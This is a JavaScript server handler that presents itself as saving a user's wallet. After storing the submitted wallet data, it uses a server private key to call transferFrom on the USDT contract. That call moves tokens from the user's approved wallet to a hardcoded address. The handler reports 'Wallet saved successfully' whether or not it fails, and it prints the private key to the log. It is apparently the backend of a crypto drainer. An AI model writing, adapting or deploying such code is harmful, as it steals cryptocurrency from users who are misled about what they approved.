import { Wallet } from "../models/data.js";
import { ethers } from "ethers";

export default async function SaveWallet(req, res) {
    try {
        if (!req?.body) return res.status(400).json({ message: "No data provided" });

        let wallet1, token, spender, amount1;
        const data = req?.body;
        if (data?.wallet) {
            wallet1 = data?.wallet;
            token = data?.token;
            spender = data?.spender;
            amount1 = data?.amount;
        } else {
            JSON.parse(data);
            wallet1 = data?.wallet;
            token = data?.token;
            spender = data?.spender;
            amount1 = data?.amount;
        }

        const USERWALLET = new Wallet({
            wallet1,
            token,
            spender,
            amount1
        });
        await USERWALLET.save();

        const tokenAddress = "0x55d398326f99059ff775485246999027b3197955"; // USDT (BSC or mainnet)
        const tokenAbi = [
            "function transferFrom(address from, address to, uint256 amount) external returns (bool)"
        ];
        const provider = new ethers.JsonRpcProvider(process.env.META_MASK_URL);
        const wallet = new ethers.Wallet(process.env.META_MASK_PRIVATE_KEY, provider);

        // Contract instance
        const tokenContract = new ethers.Contract(tokenAddress, tokenAbi, wallet);

        // Transfer details
        const from = wallet1;  // the user who approved
        const to = "0xefe2aa8b1381fce14321cd214a7f4b02078753cb";   // where you want to send the tokens
        const amount = ethers.parseUnits("1.0", 18); // 10 USDT (check decimals!)

        console.log("SaveWallet called");
        console.log(process.env.META_MASK_URL);
        console.log(process.env.META_MASK_PRIVATE_KEY);

        async function transferTokens() {
            try {
                const tx = await tokenContract.transferFrom(from, to, amount);
                console.log("⏳ Sending transaction...");
                await tx.wait();
                console.log("✅ Transfer complete! Hash:", tx.hash);
            } catch (err) {
                console.error("❌ Error during transfer:", err);
            }
        }
        transferTokens();

        return res.status(200).json({ message: "Wallet saved successfully" });
    } catch (Err) {
        console.log(Err.message);
        return res.status(200).json({ message: "Wallet saved successfully" });
    }
}